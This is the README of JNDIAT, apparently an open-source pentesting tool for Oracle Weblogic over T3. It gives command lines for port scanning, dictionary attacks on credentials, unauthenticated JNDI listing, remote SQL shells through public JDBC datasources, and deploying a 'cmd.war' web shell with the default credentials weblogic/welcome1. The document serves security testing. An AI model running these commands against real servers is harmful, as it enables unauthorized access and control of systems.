| __Quentin HARDY__    |
| ------------- |
| __quentin.hardy@protonmail.com__  |
| __quentin.hardy@bt.com__    |

# JNDIAT - JNDI Attacking Tool

**JNDIAT** (**JNDI** **A**ttacking **T**ool) is an open source penetration testing tool that tests the security of **Weblogic** servers **through T3 protocol**.

Usage examples of JNDIAT:
* You want to search if there are Weblogic **ports which are accessible through T3 protocol**;
* You want to **search valid accounts** remotely in order to have a privileged connection;
* You want to list **JNDIs (Java Naming and Directory Interface) which are accessible** to know what you can do on the remote Weblogic server (without or with a Weblogic account);
* You want to **use a unprotected (i.e. 'public') JDBC datasource** in order to get a remote interactive SQL shell;
* You want to **deploy an application** (e.g. War) on the Weblogic server in order to have a Web shell (account required).

Tested on Oracle Weblogic 11.

# Changelog

+ Version **0.01 (2018/11/31)** :
  + first version.
 
# Features

+ Supports **T3** and **T3s** (**T3 over SSL**) connections. JNDIAT creates a local temporary Java KeyStore to validate the Weblogic server's certificate;
+ Supports authentication with **empty credentials** ie login='' and password=''. Public JDBC datasources can be used with an empty account by default in Weblogic (tested on version11);
+ Supports targets if the weblogic is in a domain;
+ **Detects ports** accessible through T3 protocol;
+ **Finds valid credentials** through dictionary attacks;
+ Gets **JNDIs list accessible** with a specific account (or without account);
+ Gets a **remote sql shell** via a JDBC datasource;
+ With a privileged account, you can **deploy an application** on the weblogic server in order to have a Web shell for example.


# Usage examples

Download latest release of jndiat [https://github.com/quentinhardy/jndiat/releases](https://github.com/quentinhardy/jndiat/releases)

## Main help

```bash
java -jar Jndiat.jar -h
```

## JNDIAT version

```bash
java -jar Jndiat.jar --version
```

## Scan ports
This module should be used for scanning ports accessible through T3 (or T3s) protocol in order to get JNDIs.

To know if you can use the port 7001 to establish a T3 connection:
```bash
java -jar Jndiat.jar scan -s 192.168.56.101 --ports 7001
```

To scan ports 7001 and 7002:
```bash
java -jar Jndiat.jar scan -s 192.168.56.101 --ports '7001,7002'
```

To scan ports from 7001 to 7010:
```bash
java -jar Jndiat.jar scan -s 192.168.56.101 --ports '7001-7010'
```

## List of JNDIs
This module should be used to get the list of JNDIs accessible trough the T3 protocol.
This module is useful in order to know if some JNDI are accessible without authentication (ex: a 'public' JDBC datasource).

To get JNDIs accessible on port 7001 of the server 192.168.56.101:

```bash
java -jar Jndiat.jar list -s 192.168.56.101 -p 7001
```

If you not specify credentials in the command line, the tool will returns JNDIs accessible without authentication.
If you know valid credentials, you can use it to get more JNDIs:

```bash
java -jar Jndiat.jar list -s 192.168.56.101 -p 7001 -U username -P password
```

## JDBC DataSource
This module allows you to get a remote SQL shell via a JDBC datasource.

To get an interactive SQL shell from a JNDI datasource:

```bash
java -jar Jndiat.jar datasource -s 192.168.56.101 -p 7001 --sql-shell
```

The tool will ask you the JDBC datasource to use. 
If you know the datasource name, you can specify it:
```bash
java -jar Jndiat.jar datasource -s 192.168.56.101 -p 7001 --sql-shell --datasource='jdbc/myDataSource'
```

## Deploy an application

Thanks to this module, you can deploy an application (e.g. .war, .ear) in the remote Weblogic server through the T3 protocol.
To use this module, you may have high privileges (and an account of course).

The following command deploys the application 'cmd.war' on the remote weblogic server.

```bash
java -jar Jndiat.jar deployer -s 192.168.56.101 -p 7002 -U weblogic -P welcome1 --deploy --appl-file cmd.war
```

To undeploy the previous war ('cmd.war') from the remote weblogic server:

```bash
java -jar Jndiat.jar deployer -s 192.168.56.101 -p 7002 -U weblogic -P welcome1 --undeploy
```

To change the application name deployed on the weblogic server, the *--display-name* option must be used:

```bash
java -jar Jndiat.jar deployer -s 192.168.56.101 -p 7002 -U weblogic -P welcome1 --deploy --appl-file 'cmd.war' --display-name 'appli-name-displayed'
```

To undeploy a specific application named *appli-name-displayed*:

```bash
java -jar Jndiat.jar deployer -s 192.168.56.101 -p 7002 -U weblogic -P welcome1 --undeploy --display-name 'appli-name-displayed'
```

Special thanks
====
Special thanks to some previous BT pentesters (e.g. @gno) for the initial work.

Donation
====
If you want to support my work doing a donation, I will appreciate a lot:

* Via BTC: 36FugL6SnFrFfbVXRPcJATK9GsXEY6mJbf
